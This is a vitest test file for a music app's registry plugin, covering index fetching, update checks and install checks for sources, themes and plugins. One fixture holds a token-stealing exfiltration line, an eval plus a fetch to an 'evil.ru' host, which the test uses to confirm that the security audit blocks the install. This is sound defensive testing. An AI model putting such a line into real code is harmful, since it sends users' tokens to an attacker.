import { describe, expect, it, vi } from 'vitest'
import { Context } from 'cordis'
import { DEFAULT_APP_SETTINGS, sha256Hex, SourceFormatError } from '@BBeBee/protocol'
import type {
  HttpRequest,
  HttpService,
  HttpResponse,
  ImportOptions,
  ImportReport,
  LyricSourceDefinition,
  PluginInfo,
  RegistryEntry,
  RegistryIndex,
  RegistryTask,
  RegistryUpdate,
  SourceRecord,
  ThemeDefinition,
} from '@BBeBee/protocol'
import { midnightPurpleTheme } from '@BBeBee/ui-tokens'
import { apply, RegistryPlugin } from './index.js'
import { REGISTRY_VIEWS } from './views.js'

/* ── fixtures ────────────────────────────────────────────────────────────── */

const DEFAULT_ENDPOINT = 'https://raw.githubusercontent.com/BBeBeeX/B_Be_Bee-registry/main/registry.json'
const INDEX_CACHE_KEY = 'registry.index-cache'
const PREFS_KEY = 'registry.prefs'

function makeSourceRecord(sourceUrl: string, version?: string): SourceRecord {
  const doc: Record<string, unknown> = { sourceUrl, sourceName: 'Foo Music' }
  if (version) doc['version'] = version
  return {
    id: 'foo-music-1234',
    sourceUrl,
    name: 'Foo Music',
    type: 'music',
    doc: doc as unknown as SourceRecord['doc'],
    docJson: JSON.stringify(doc),
    docHash: 'deadbeef',
    enabled: true,
    sortOrder: 0,
    allowedHosts: ['foo.example'],
    locallyModified: false,
    importedAt: 0,
    updatedAt: 0,
    failCount: 0,
  }
}

function makeLyricSource(id: string, version?: string): LyricSourceDefinition {
  return {
    id,
    name: id,
    enabled: true,
    sortOrder: 0,
    script: '// noop',
    ...(version ? { version } : {}),
  }
}

/** A theme known to pass WCAG AA in both schemes: a built-in, re-identified. */
function makePassingTheme(id: string, version?: string): ThemeDefinition {
  return {
    ...midnightPurpleTheme,
    id,
    name: 'Registry Theme',
    ...(version ? { version } : {}),
  }
}

function makeFailingTheme(id: string): ThemeDefinition {
  const base = makePassingTheme(id)
  return {
    ...base,
    tokens: {
      ...base.tokens,
      text: { ...base.tokens.text, primary: base.tokens.bg.app },
    },
  }
}

function makePluginInfo(id: string, version: string): PluginInfo {
  return {
    id,
    name: id,
    displayName: id,
    version,
    systemId: 'layer-4',
    enabled: true,
    state: 'ACTIVE',
    waitingFor: [],
    dependencies: [],
    dependents: [],
  }
}

function makePluginBundle(manifestId: string, version: string): {
  bytes: Uint8Array
  files: Record<string, string>
} {
  const bundle = {
    manifest: {
      id: manifestId,
      name: manifestId,
      displayName: 'External Plugin',
      version,
      systemId: 'layer-4',
      moduleId: 'registry',
      engines: { BBeBee: '^0.1.0' },
      entry: { main: './index.js' },
      capabilities: [],
    },
    files: {
      'index.js': 'export const name = "external"\n',
    },
  }
  return { bytes: new TextEncoder().encode(JSON.stringify(bundle)), files: bundle.files }
}

/* ── mocks ───────────────────────────────────────────────────────────────── */

function makeResponse(url: string, bytes: Uint8Array, status = 200): HttpResponse {
  const text = new TextDecoder().decode(bytes)
  return {
    status,
    headers: { 'content-type': 'application/json' },
    url,
    text: async () => text,
    json: async () => JSON.parse(text),
    bytes: async () => bytes,
    stream: () => new ReadableStream<Uint8Array>(),
  }
}

interface HttpSpec {
  /** URL → JSON body (a string body is served verbatim). */
  json?: Record<string, unknown>
  /** URL → raw bytes body. */
  bytes?: Record<string, Uint8Array>
  /** URL → response status override (4xx/5xx). */
  status?: Record<string, number>
  /** URL → transport failure. */
  fail?: Record<string, Error>
}

function makeHttp(spec: HttpSpec): HttpService {
  // Read through `spec` lazily: a test may mutate the spec between calls.
  const getBytes = (url: string): Uint8Array => {
    const failure = spec.fail?.[url]
    if (failure) throw failure
    const raw = spec.bytes?.[url]
    if (raw) return raw
    const body = spec.json?.[url]
    if (body !== undefined) {
      return typeof body === 'string' ? new TextEncoder().encode(body) : new TextEncoder().encode(JSON.stringify(body))
    }
    if (spec.status?.[url] !== undefined) return new Uint8Array()
    throw new Error(`http mock: no route for ${url}`)
  }

  const service = (async (req: HttpRequest) => {
    return makeResponse(req.url, getBytes(req.url), spec.status?.[req.url])
  }) as HttpService

  service.get = (async <T,>(url: string) => {
    const response = await service({ url, method: 'GET' })
    if (response.status >= 400) throw new Error(`http mock: status ${response.status} for ${url}`)
    return (await response.json()) as T
  }) as HttpService['get']

  service.post = (async () => {
    throw new Error('http mock: post not supported')
  }) as HttpService['post']

  service.download = (async () => {
    throw new Error('http mock: download not supported')
  }) as never

  Object.defineProperty(service, 'cookies', { value: {} })

  return service
}

function makeStore() {
  const data = new Map<string, unknown>()
  const store = {
    get: vi.fn(async (key: string) => data.get(key)),
    set: vi.fn(async (key: string, value: unknown) => {
      data.set(key, value)
    }),
    delete: vi.fn(async (key: string) => {
      data.delete(key)
    }),
    keys: vi.fn(async (prefix?: string) =>
      [...data.keys()].filter((key) => !prefix || key.startsWith(prefix)),
    ),
    namespace: vi.fn(() => store),
  }
  return { store, data }
}

/** Drain microtasks and timers so the init-time `ctx.inject` callbacks have run. */
const settle = (): Promise<void> => new Promise((resolve) => setTimeout(resolve, 0))

interface SetupOptions {
  http?: HttpSpec
  index?: RegistryIndex
  sources?: SourceRecord[]
  lyricSources?: LyricSourceDefinition[]
  themes?: ThemeDefinition[]
  plugins?: PluginInfo[]
  registryAutoCheck?: boolean
  autoCheckDelayMs?: number
  autoCheckIntervalMs?: number
}

function setup(options: SetupOptions = {}) {
  const ctx = new Context()
  const { store, data } = makeStore()
  ctx.provide('store', store)

  const httpSpec: HttpSpec = options.http ?? {
    json: { [DEFAULT_ENDPOINT]: options.index ?? { entries: [] } },
  }
  ctx.provide('http', makeHttp(httpSpec))

  const sources = {
    sources: options.sources ?? [],
    import: vi.fn(async (_input: string, _opts?: ImportOptions): Promise<ImportReport> => ({
      added: [],
      updated: [],
      unchanged: [],
      rejected: [],
      conflicts: [],
    })),
  }
  ctx.provide('sources', sources)

  const lyricSources = {
    getSources: vi.fn(() => options.lyricSources ?? []),
    registerSource: vi.fn(async () => {}),
  }
  ctx.provide('lyricSources', lyricSources)

  const theme = {
    getThemes: vi.fn(() => options.themes ?? []),
    registerTheme: vi.fn(() => () => {}),
  }
  ctx.provide('theme', theme)

  const pluginManager = {
    list: vi.fn(() => options.plugins ?? []),
  }
  ctx.provide('plugin-manager', pluginManager)

  const settingsSnapshot = { ...DEFAULT_APP_SETTINGS, registryAutoCheck: options.registryAutoCheck ?? false }
  const settings = {
    getSync: vi.fn(() => ({ ...settingsSnapshot })),
    get: vi.fn(async () => ({ ...settingsSnapshot })),
    update: vi.fn(async (partial: Record<string, unknown>) => partial),
  }
  ctx.provide('settings', settings)

  const plugin = new RegistryPlugin(ctx, {
    ...(options.autoCheckDelayMs === undefined ? {} : { autoCheckDelayMs: options.autoCheckDelayMs }),
    ...(options.autoCheckIntervalMs === undefined ? {} : { autoCheckIntervalMs: options.autoCheckIntervalMs }),
  })

  return { ctx, plugin, data, httpSpec, sources, lyricSources, theme, pluginManager, settings }
}

async function setupInitialized(options: SetupOptions = {}) {
  const harness = setup(options)
  await harness.plugin[RegistryPlugin.init]()
  await settle()
  return harness
}

function entryOf(partial: Partial<RegistryEntry> & Pick<RegistryEntry, 'id' | 'kind' | 'name'>): RegistryEntry {
  return partial as RegistryEntry
}

/* ── semver (re-exported from @BBeBee/toolkit) ───────────────────────────── */

describe('semver re-export', () => {
  it('keeps the ./semver subpath working after the move to the toolkit', async () => {
    const mod = await import('./semver.js')
    expect(mod.compareVersions('1.10.0', '1.9.0')).toBe(1)
    expect(mod.normalizeVersion('v2.3.4')).toBe('2.3.4')
  })
})

/* ── view contributions ──────────────────────────────────────────────────── */

describe('ui contributions', () => {
  it('contributes the registry route and the settings card when a ui service exists', async () => {
    const contributions: Array<{ kind?: string; id: string }> = []
    const harness = setup()
    harness.ctx.provide('ui', {
      contribute: (c: { kind?: string; id: string }) => {
        contributions.push(c)
        return () => {}
      },
    })
    await harness.plugin[RegistryPlugin.init]()
    await settle()

    expect(contributions).toEqual([
      expect.objectContaining({
        kind: 'route',
        id: REGISTRY_VIEWS.screen,
        path: '/registry',
        placement: ['tray'],
      }),
      expect.objectContaining({
        kind: 'settings',
        id: REGISTRY_VIEWS.settingsCard,
        section: 'sources',
        display: 'card',
      }),
    ])
  })
})

/* ── lastCheckedAt ───────────────────────────────────────────────────────── */

describe('lastCheckedAt', () => {
  it('is undefined before the first check and set after one', async () => {
    const { plugin } = await setupInitialized({
      index: { entries: [] },
    })
    expect(plugin.lastCheckedAt()).toBeUndefined()

    await plugin.checkUpdates()
    expect(plugin.lastCheckedAt()).toBeGreaterThan(0)
  })
})

describe('lastIndexFetchFailed', () => {
  it('tracks whether getIndex fell back to the cached copy', async () => {
    const { plugin, httpSpec, data } = await setupInitialized({
      index: { entries: [entryOf({ id: 'known', kind: 'theme', name: 'Known' })] },
    })
    await plugin.getIndex()
    expect(plugin.lastIndexFetchFailed()).toBe(false)

    // Offline: getIndex resolves with the cache, and says so.
    httpSpec.fail = { [DEFAULT_ENDPOINT]: new Error('offline') }
    data.set(INDEX_CACHE_KEY, { fetchedAt: 1, index: { entries: [] } })
    await plugin.getIndex()
    expect(plugin.lastIndexFetchFailed()).toBe(true)

    // Back online: the flag clears on the next good fetch.
    httpSpec.fail = undefined
    await plugin.getIndex()
    expect(plugin.lastIndexFetchFailed()).toBe(false)
  })
})

/* ── getIndex ────────────────────────────────────────────────────────────── */

describe('getIndex', () => {
  it('fetches the index and caches the last good copy', async () => {
    const index: RegistryIndex = { entries: [], generatedAt: '2026-01-01T00:00:00Z' }
    const { plugin, data } = await setupInitialized({ index })

    await expect(plugin.getIndex()).resolves.toEqual(index)
    const cached = data.get(INDEX_CACHE_KEY) as { fetchedAt: number; index: RegistryIndex }
    expect(cached.fetchedAt).toBeGreaterThan(0)
    expect(cached.index).toEqual(index)
  })

  it('falls back to the cached copy when the network fails', async () => {
    const good: RegistryIndex = { entries: [entryOf({ id: 'known', kind: 'theme', name: 'Known' })] }
    const { plugin, data } = await setupInitialized({
      http: { fail: { [DEFAULT_ENDPOINT]: new Error('offline') } },
    })
    data.set(INDEX_CACHE_KEY, { fetchedAt: 1, index: good })

    await expect(plugin.getIndex()).resolves.toEqual(good)
  })

  it('returns an empty index when the network fails and no cache exists', async () => {
    const { plugin } = await setupInitialized({
      http: { fail: { [DEFAULT_ENDPOINT]: new Error('offline') } },
    })
    await expect(plugin.getIndex()).resolves.toEqual({ entries: [] })
  })

  it('drops malformed entries and keeps valid ones', async () => {
    const { plugin } = await setupInitialized({
      http: {
        json: {
          [DEFAULT_ENDPOINT]: {
            entries: [
              { id: 'good', kind: 'theme', name: 'Good', version: '1.0.0' },
              { kind: 'theme', name: 'No id' },
              { id: 'bad-kind', kind: 'car', name: 'Bad kind' },
              'not an object',
            ],
          },
        },
      },
    })
    const index = await plugin.getIndex()
    expect(index.entries.map((entry) => entry.id)).toEqual(['good'])
  })

  it('refuses a malformed index document, serving the cache instead', async () => {
    const good: RegistryIndex = { entries: [entryOf({ id: 'known', kind: 'theme', name: 'Known' })] }
    const { plugin, data } = await setupInitialized({
      http: { json: { [DEFAULT_ENDPOINT]: { nope: true } } },
    })
    data.set(INDEX_CACHE_KEY, { fetchedAt: 1, index: good })

    await expect(plugin.getIndex()).resolves.toEqual(good)
  })

  it('prefers a configured endpoint over the default', async () => {
    const mirror = 'https://mirror.example/registry.json'
    const { plugin, data } = await setupInitialized({
      http: { json: { [mirror]: { entries: [{ id: 'from-mirror', kind: 'theme', name: 'Mirror' }] } } },
    })
    data.set(PREFS_KEY, { endpoint: mirror })

    const index = await plugin.getIndex()
    expect(index.entries.map((entry) => entry.id)).toEqual(['from-mirror'])
  })
})

/* ── checkUpdates ────────────────────────────────────────────────────────── */

describe('checkUpdates', () => {
  it('matches music sources by sourceUrl and treats a missing doc version as 0.0.0', async () => {
    const entry = entryOf({
      id: 'music-foo',
      kind: 'music-source',
      name: 'Foo Music',
      version: '1.1.0',
      sourceUrl: 'https://foo.example',
      downloadUrl: 'https://cdn.example/foo.json',
    })
    const { plugin } = await setupInitialized({
      index: { entries: [entry] },
      sources: [makeSourceRecord('https://foo.example')],
    })

    const updates = await plugin.checkUpdates()
    expect(updates).toHaveLength(1)
    expect(updates[0]).toMatchObject({
      kind: 'music-source',
      id: 'music-foo',
      installedVersion: '0.0.0',
      availableVersion: '1.1.0',
      downloadUrl: 'https://cdn.example/foo.json',
    })
  })

  it('reports no update when the installed version equals the published one', async () => {
    const entry = entryOf({
      id: 'music-foo',
      kind: 'music-source',
      name: 'Foo Music',
      version: '1.0.0',
      sourceUrl: 'https://foo.example',
    })
    const { plugin } = await setupInitialized({
      index: { entries: [entry] },
      sources: [makeSourceRecord('https://foo.example', '1.0.0')],
    })
    await expect(plugin.checkUpdates()).resolves.toEqual([])
  })

  it('matches lyric sources by id and flags builtin installs', async () => {
    const { plugin } = await setupInitialized({
      index: {
        entries: [
          entryOf({ id: 'builtin-lrclib', kind: 'lyric-source', name: 'LRCLIB', version: '1.2.0' }),
          entryOf({ id: 'my-lyric', kind: 'lyric-source', name: 'My Lyric', version: '2.0.0' }),
          entryOf({ id: 'not-installed', kind: 'lyric-source', name: 'Ghost', version: '9.9.9' }),
        ],
      },
      lyricSources: [makeLyricSource('builtin-lrclib', '1.0.0'), makeLyricSource('my-lyric', '2.0.0')],
    })

    const updates = await plugin.checkUpdates()
    expect(updates.map((update) => update.id)).toEqual(['builtin-lrclib'])
    expect(updates[0]?.builtin).toBe(true)
    expect(updates[0]?.installedVersion).toBe('1.0.0')
  })

  it('matches themes and plugins by id', async () => {
    const { plugin } = await setupInitialized({
      index: {
        entries: [
          entryOf({ id: 'reg-theme', kind: 'theme', name: 'Registry Theme', version: '2.0.0' }),
          entryOf({ id: 'ext-plugin', kind: 'plugin', name: 'External', version: '0.9.0' }),
        ],
      },
      themes: [makePassingTheme('reg-theme', '1.0.0')],
      plugins: [makePluginInfo('ext-plugin', '0.8.0')],
    })

    const updates = await plugin.checkUpdates()
    expect(updates).toHaveLength(2)
    const theme = updates.find((update) => update.kind === 'theme')
    const ext = updates.find((update) => update.kind === 'plugin')
    expect(theme).toMatchObject({ id: 'reg-theme', installedVersion: '1.0.0', availableVersion: '2.0.0' })
    expect(ext).toMatchObject({ id: 'ext-plugin', installedVersion: '0.8.0', availableVersion: '0.9.0' })
  })

  it('skips entries without a version', async () => {
    const { plugin } = await setupInitialized({
      index: {
        entries: [entryOf({ id: 'reg-theme', kind: 'theme', name: 'Registry Theme' })],
      },
      themes: [makePassingTheme('reg-theme', '1.0.0')],
    })
    await expect(plugin.checkUpdates()).resolves.toEqual([])
  })

  it('emits the event with the full list, including when it is empty', async () => {
    const { ctx, plugin, httpSpec, data } = await setupInitialized({
      index: { entries: [entryOf({ id: 'reg-theme', kind: 'theme', name: 'Registry Theme', version: '2.0.0' })] },
      themes: [makePassingTheme('reg-theme', '2.0.0')],
    })

    const seen: (readonly RegistryUpdate[])[] = []
    ctx.on('registry/updates-available', (updates) => seen.push(updates))

    await plugin.checkUpdates()
    expect(seen).toHaveLength(1)
    expect(seen[0]).toEqual([])

    // The registry publishes a newer version; the next check emits the update.
    httpSpec.json = {
      [DEFAULT_ENDPOINT]: { entries: [entryOf({ id: 'reg-theme', kind: 'theme', name: 'Registry Theme', version: '3.0.0' })] },
    }
    await plugin.checkUpdates()
    expect(seen).toHaveLength(2)
    expect(seen[1]).toEqual([
      expect.objectContaining({ id: 'reg-theme', installedVersion: '2.0.0', availableVersion: '3.0.0' }),
    ])

    const prefs = data.get(PREFS_KEY) as { lastCheckAt?: number }
    expect(prefs.lastCheckAt).toBeGreaterThan(0)
  })

  it('skips every kind when no collaborator has been captured yet', async () => {
    // `setup()` without init: the optional collaborators are captured by the
    // init-time inject callbacks, so none of them is available here.
    const { plugin } = setup({
      index: { entries: [entryOf({ id: 'reg-theme', kind: 'theme', name: 'Registry Theme', version: '2.0.0' })] },
      themes: [makePassingTheme('reg-theme', '1.0.0')],
    })
    await plugin.checkUpdates()
    expect(plugin.updates()).toEqual([])
  })
})

describe('updates', () => {
  it('returns the previous result without re-fetching', async () => {
    const { plugin } = await setupInitialized({
      index: { entries: [entryOf({ id: 'reg-theme', kind: 'theme', name: 'Registry Theme', version: '2.0.0' })] },
      themes: [makePassingTheme('reg-theme', '1.0.0')],
    })
    const http = (plugin as unknown as { http: HttpService }).http
    const getSpy = vi.fn(http.get.bind(http))
    http.get = getSpy as HttpService['get']

    await plugin.checkUpdates()
    expect(plugin.updates()).toHaveLength(1)
    const fetchesAfterCheck = getSpy.mock.calls.length

    plugin.updates()
    plugin.updates()
    expect(getSpy.mock.calls.length).toBe(fetchesAfterCheck)
  })
})

/* ── fetchEntryDetails ───────────────────────────────────────────────────── */

describe('fetchEntryDetails', () => {
  it('returns the music document allowlist for the confirm dialog', async () => {
    const url = 'https://cdn.example/foo.json'
    const { plugin } = await setupInitialized({
      http: {
        json: { [url]: { sourceUrl: 'https://foo.example', allowedHosts: ['foo.example', 'cdn.foo.example'] } },
      },
    })
    const details = await plugin.fetchEntryDetails(
      entryOf({ id: 'music-foo', kind: 'music-source', name: 'Foo Music', downloadUrl: url }),
    )
    expect(details.allowedHosts).toEqual(['foo.example', 'cdn.foo.example'])
    expect(details.isBuiltinInstall).toBe(false)
    expect(details.isLocallyModified).toBeUndefined()
  })

  it('flags a locally modified music source in fetchEntryDetails', async () => {
    const url = 'https://cdn.example/foo.json'
    const modifiedRecord = {
      ...makeSourceRecord('https://foo.example', '1.0.0'),
      locallyModified: true,
    }
    const { plugin } = await setupInitialized({
      http: {
        json: { [url]: { sourceUrl: 'https://foo.example', allowedHosts: ['foo.example'] } },
      },
      sources: [modifiedRecord],
    })
    const details = await plugin.fetchEntryDetails(
      entryOf({ id: 'music-foo', kind: 'music-source', name: 'Foo Music', downloadUrl: url, sourceUrl: 'https://foo.example' }),
    )
    expect(details.isLocallyModified).toBe(true)
  })

  it('flags a builtin lyric-source install and surfaces its hosts', async () => {
    const url = 'https://cdn.example/lrclib.json'
    const { plugin } = await setupInitialized({
      http: { json: { [url]: { allowedHosts: ['lrclib.net'] } } },
    })
    const details = await plugin.fetchEntryDetails(
      entryOf({ id: 'builtin-lrclib', kind: 'lyric-source', name: 'LRCLIB', downloadUrl: url }),
    )
    expect(details.isBuiltinInstall).toBe(true)
    expect(details.allowedHosts).toEqual(['lrclib.net'])
  })

  it('returns the entry itself for a plugin, without fetching', async () => {
    const { plugin } = await setupInitialized({
      http: { fail: { 'https://cdn.example/ext.json': new Error('must not be fetched') } },
    })
    const entry = entryOf({
      id: 'ext-plugin',
      kind: 'plugin',
      name: 'External',
      capabilities: ['net:host/*'],
    })
    const details = await plugin.fetchEntryDetails(entry)
    expect(details.entry).toEqual(entry)
    expect(details.allowedHosts).toBeUndefined()
  })
})

/* ── install ─────────────────────────────────────────────────────────────── */

describe('install', () => {
  it('routes a music source through ctx.sources.import with the fetched text', async () => {
    const url = 'https://cdn.example/foo-1.1.0.json'
    const document = JSON.stringify({ sourceUrl: 'https://foo.example', sourceName: 'Foo Music', version: '1.1.0' })
    const harness = await setupInitialized({
      http: { json: { [url]: document } },
      sources: [makeSourceRecord('https://foo.example', '1.0.0')],
    })
    harness.sources.import.mockResolvedValueOnce({
      added: [],
      updated: [{ record: makeSourceRecord('https://foo.example', '1.1.0'), changedFields: ['version'] }],
      unchanged: [],
      rejected: [],
      conflicts: [],
    })

    await harness.plugin.install(
      entryOf({ id: 'music-foo', kind: 'music-source', name: 'Foo Music', downloadUrl: url, sourceUrl: 'https://foo.example' }),
    )
    expect(harness.sources.import).toHaveBeenCalledWith(document, { originUri: url })
  })

  it('forwards overwrite option to ctx.sources.import', async () => {
    const url = 'https://cdn.example/foo-1.1.0.json'
    const document = JSON.stringify({ sourceUrl: 'https://foo.example', sourceName: 'Foo Music', version: '1.1.0' })
    const harness = await setupInitialized({
      http: { json: { [url]: document } },
      sources: [makeSourceRecord('https://foo.example', '1.0.0')],
    })
    harness.sources.import.mockResolvedValueOnce({
      added: [],
      updated: [{ record: makeSourceRecord('https://foo.example', '1.1.0'), changedFields: ['version'] }],
      unchanged: [],
      rejected: [],
      conflicts: [],
    })

    await harness.plugin.install(
      entryOf({ id: 'music-foo', kind: 'music-source', name: 'Foo Music', downloadUrl: url, sourceUrl: 'https://foo.example' }),
      { overwrite: true },
    )
    expect(harness.sources.import).toHaveBeenCalledWith(document, { originUri: url, overwrite: true })
  })

  it('throws with the rejection messages when the music document is not imported', async () => {
    const url = 'https://cdn.example/foo-broken.json'
    const harness = await setupInitialized({
      http: { json: { [url]: '{ "sourceUrl": broken' } },
    })
    harness.sources.import.mockResolvedValueOnce({
      added: [],
      updated: [],
      unchanged: [],
      rejected: [{ index: 0, sourceName: 'Foo Music', error: new SourceFormatError('missing ruleStream') }],
      conflicts: [],
    })

    await expect(
      harness.plugin.install(
        entryOf({ id: 'music-foo', kind: 'music-source', name: 'Foo Music', downloadUrl: url, sourceUrl: 'https://foo.example' }),
      ),
    ).rejects.toThrow(/not imported — Foo Music: missing ruleStream/)
  })

  it('refuses a theme that fails the contrast check and registers one that passes', async () => {
    const failingUrl = 'https://cdn.example/bad-theme.json'
    const passingUrl = 'https://cdn.example/good-theme.json'
    const harness = await setupInitialized({
      http: {
        json: {
          [failingUrl]: makeFailingTheme('bad-theme'),
          [passingUrl]: makePassingTheme('good-theme', '2.0.0'),
        },
      },
    })

    await expect(
      harness.plugin.install(entryOf({ id: 'bad-theme', kind: 'theme', name: 'Bad', downloadUrl: failingUrl })),
    ).rejects.toThrow(/failed the contrast check/)
    expect(harness.theme.registerTheme).not.toHaveBeenCalled()

    await harness.plugin.install(entryOf({ id: 'good-theme', kind: 'theme', name: 'Good', downloadUrl: passingUrl }))
    expect(harness.theme.registerTheme).toHaveBeenCalledWith(
      expect.objectContaining({ id: 'good-theme', version: '2.0.0' }),
    )
  })

  it('refuses a lyric source without id/name/script and registers a complete one', async () => {
    const badUrl = 'https://cdn.example/bad-lyric.json'
    const goodUrl = 'https://cdn.example/good-lyric.json'
    const harness = await setupInitialized({
      http: {
        json: {
          [badUrl]: { id: 'x', name: 'No script here' },
          [goodUrl]: { id: 'good-lyric', name: 'Good Lyric', script: 'return null', allowedHosts: ['lyrics.example'] },
        },
      },
    })

    await expect(
      harness.plugin.install(entryOf({ id: 'bad-lyric', kind: 'lyric-source', name: 'Bad', downloadUrl: badUrl })),
    ).rejects.toThrow(/missing non-empty id\/name\/script/)

    await harness.plugin.install(entryOf({ id: 'good-lyric', kind: 'lyric-source', name: 'Good', downloadUrl: goodUrl }))
    expect(harness.lyricSources.registerSource).toHaveBeenCalledWith(
      expect.objectContaining({ id: 'good-lyric', script: 'return null' }),
    )
  })

  it('refuses a plugin bundle whose sha256 does not match', async () => {
    const url = 'https://cdn.example/ext-plugin.json'
    const { bytes } = makePluginBundle('ext-plugin', '1.0.0')
    const harness = await setupInitialized({
      http: { bytes: { [url]: bytes } },
    })

    await expect(
      harness.plugin.install(
        entryOf({ id: 'ext-plugin', kind: 'plugin', name: 'External', downloadUrl: url, sha256: '0'.repeat(64) }),
      ),
    ).rejects.toThrow(/failed the integrity check/)
  })

  it('refuses to install a plugin entry that publishes no digest', async () => {
    const url = 'https://cdn.example/ext-plugin.json'
    const { bytes } = makePluginBundle('ext-plugin', '1.0.0')
    const { plugin } = await setupInitialized({ http: { bytes: { [url]: bytes } } })

    await expect(
      plugin.install(entryOf({ id: 'ext-plugin', kind: 'plugin', name: 'External', downloadUrl: url })),
    ).rejects.toThrow(/no sha256 digest/)
  })

  it('calls the installer bridge for a bundle whose sha256 matches', async () => {
    const url = 'https://cdn.example/ext-plugin.json'
    const { bytes, files } = makePluginBundle('ext-plugin', '1.0.0')
    const harness = await setupInitialized({
      http: { bytes: { [url]: bytes } },
    })
    const installer = vi.fn(async () => {})
    harness.plugin.setPluginInstaller(installer)

    await harness.plugin.install(
      entryOf({ id: 'ext-plugin', kind: 'plugin', name: 'External', downloadUrl: url, sha256: sha256Hex(bytes) }),
    )
    expect(installer).toHaveBeenCalledWith({
      manifest: expect.objectContaining({ id: 'ext-plugin' }),
      files,
    })
  })

  it('refuses a plugin install when no installer bridge is set (mobile)', async () => {
    const url = 'https://cdn.example/ext-plugin.json'
    const { bytes } = makePluginBundle('ext-plugin', '1.0.0')
    const harness = await setupInitialized({
      http: { bytes: { [url]: bytes } },
    })

    await expect(
      harness.plugin.install(
        entryOf({ id: 'ext-plugin', kind: 'plugin', name: 'External', downloadUrl: url, sha256: sha256Hex(bytes) }),
      ),
    ).rejects.toThrow(/only supported on desktop/)
  })

  it('refuses an entry without a downloadUrl', async () => {
    const { plugin } = await setupInitialized()
    await expect(
      plugin.install(entryOf({ id: 'music-foo', kind: 'music-source', name: 'Foo Music' })),
    ).rejects.toThrow(/no downloadUrl/)
  })
})

/* ── author repository artifact chain & security audit (Group 5) ─────────── */

describe('author repository artifact chain and security audit (Group 5)', () => {
  it('discovers registry index entries via GitHub Contents API across 4 directories', async () => {
    const musicItem = {
      id: 'music-api-source',
      kind: 'music-source',
      name: 'API Music Source',
      version: '1.0.0',
      repoUrl: 'https://github.com/alice/music-source',
    }
    const lyricItem = {
      id: 'lyric-api-source',
      kind: 'lyric-source',
      name: 'API Lyric Source',
      version: '1.2.0',
      repoUrl: 'https://github.com/bob/lyric-source',
    }
    const pluginItem = {
      id: 'plugin-api',
      kind: 'plugin',
      name: 'API Plugin',
      version: '2.0.0',
      repoUrl: 'https://github.com/charlie/plugin',
    }
    const themeItem = {
      id: 'theme-api',
      kind: 'theme',
      name: 'API Theme',
      version: '1.0.0',
      repoUrl: 'https://github.com/dave/theme',
    }

    const harness = await setupInitialized({
      http: {
        json: {
          'https://api.github.com/repos/BBeBeeX/B_Be_Bee-registry/contents/music-sources': [
            { name: 'alice.json', type: 'file', download_url: 'https://cdn.example/music.json' },
          ],
          'https://api.github.com/repos/BBeBeeX/B_Be_Bee-registry/contents/lyric-sources': [
            { name: 'bob.json', type: 'file', download_url: 'https://cdn.example/lyric.json' },
          ],
          'https://api.github.com/repos/BBeBeeX/B_Be_Bee-registry/contents/plugins': [
            { name: 'charlie.json', type: 'file', download_url: 'https://cdn.example/plugin.json' },
          ],
          'https://api.github.com/repos/BBeBeeX/B_Be_Bee-registry/contents/themes': [
            { name: 'dave.json', type: 'file', download_url: 'https://cdn.example/theme.json' },
          ],
          'https://cdn.example/music.json': musicItem,
          'https://cdn.example/lyric.json': lyricItem,
          'https://cdn.example/plugin.json': pluginItem,
          'https://cdn.example/theme.json': themeItem,
        },
      },
    })

    const index = await harness.plugin.getIndex(true)
    expect(index.entries.length).toBe(4)
    expect(index.entries.map((e) => e.id)).toEqual([
      'music-api-source',
      'lyric-api-source',
      'plugin-api',
      'theme-api',
    ])
  })

  it('blocks installation when security audit discovers malicious code (eval + undeclared host)', async () => {
    const harness = await setupInitialized({
      http: {
        json: {
          'https://api.github.com/repos/evil-author/bad-plugin/commits/HEAD': {
            sha: 'evil1234567890',
          },
          'https://raw.githubusercontent.com/evil-author/bad-plugin/evil1234567890/manifest.json': {
            id: 'bad-plugin',
            version: '1.0.0',
            displayName: 'Bad Plugin',
            entry: { main: './index.js' },
            capabilities: ['net:host/*'],
          },
        },
        bytes: {
          'https://raw.githubusercontent.com/evil-author/bad-plugin/evil1234567890/index.js': new TextEncoder().encode(
            'eval("stealToken()"); fetch("https://evil.ru/leak");',
          ),
        },
      },
    })

    const entry = entryOf({
      id: 'bad-plugin',
      kind: 'plugin',
      name: 'Bad Plugin',
      repoUrl: 'https://github.com/evil-author/bad-plugin',
      capabilities: ['net:host/*'],
    })

    await expect(harness.plugin.install(entry)).rejects.toThrow(/security audit blocked installation/)
  })

  it('rejects installation when plugin capabilities in manifest do not match registry metadata', async () => {
    const harness = await setupInitialized({
      http: {
        json: {
          'https://api.github.com/repos/mismatch-author/ext-plugin/commits/HEAD': {
            sha: 'commit111',
          },
          'https://raw.githubusercontent.com/mismatch-author/ext-plugin/commit111/manifest.json': {
            id: 'ext-plugin',
            version: '1.0.0',
            displayName: 'Ext Plugin',
            entry: { main: './index.js' },
            capabilities: ['net:host/*', 'device:bluetooth'],
          },
        },
        bytes: {
          'https://raw.githubusercontent.com/mismatch-author/ext-plugin/commit111/index.js': new TextEncoder().encode(
            'export default function() {}',
          ),
        },
      },
    })

    const entry = entryOf({
      id: 'ext-plugin',
      kind: 'plugin',
      name: 'Ext Plugin',
      repoUrl: 'https://github.com/mismatch-author/ext-plugin',
      capabilities: ['net:host/*'],
    })

    await expect(harness.plugin.install(entry)).rejects.toThrow(
      /capabilities mismatch between manifest and registry metadata/,
    )
  })

  it('rejects with clear error when author repository is unreachable / 404', async () => {
    const harness = await setupInitialized({
      http: {
        status: {
          'https://api.github.com/repos/unknown-author/missing-repo/commits/HEAD': 404,
          'https://api.github.com/repos/unknown-author/missing-repo': 404,
        },
      },
    })

    const entry = entryOf({
      id: 'missing-plugin',
      kind: 'plugin',
      name: 'Missing Plugin',
      repoUrl: 'https://github.com/unknown-author/missing-repo',
    })

    await expect(harness.plugin.install(entry)).rejects.toThrow(/failed to resolve author repository/)
  })

  it('records into registry.lock.json and updates lock record on commit advance', async () => {
    let installedBundle: any
    const httpSpec = {
      json: {
        'https://api.github.com/repos/good-author/safe-plugin/commits/HEAD': {
          sha: 'commit-v1-sha',
        },
        'https://raw.githubusercontent.com/good-author/safe-plugin/commit-v1-sha/manifest.json': {
          id: 'safe-plugin',
          version: '1.0.0',
          displayName: 'Safe Plugin',
          entry: { main: './index.js' },
          capabilities: ['audio:dsp'],
        },
        'https://raw.githubusercontent.com/good-author/safe-plugin/commit-v2-sha/manifest.json': {
          id: 'safe-plugin',
          version: '1.1.0',
          displayName: 'Safe Plugin',
          entry: { main: './index.js' },
